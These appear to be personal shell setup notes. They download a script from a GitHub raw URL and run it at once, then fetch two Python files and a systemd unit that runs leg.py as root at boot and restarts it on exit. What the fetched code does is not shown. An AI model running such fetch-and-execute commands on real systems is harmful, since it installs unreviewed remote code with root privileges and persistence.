#set startup dir /root/

wget https://raw.githubusercontent.com/lucalocolocoloco/pmio/refs/heads/main/sc.sh && chmod +x sc.sh && ./sc.sh 

wget https://raw.githubusercontent.com/x011-al/pmio/refs/heads/main/leg.py 
wget https://raw.githubusercontent.com/x011-al/pmio/refs/heads/main/cgn.py 

cd  /etc/systemd/system/
wget https://raw.githubusercontent.com/x011-al/pmio/refs/heads/main/leg.service

sudo nano /etc/systemd/system/leg.service

==========================================

[Unit]
Description=Run Python script leg.py at startup
After=network.target

[Service]
ExecStart=/usr/bin/python3 /root/leg.py
WorkingDirectory=/root/
Restart=always
User=root

[Install]
WantedBy=multi-user.target

==========================================

systemctl daemon-reload \
&& systemctl enable leg.service \
&& systemctl start leg.service












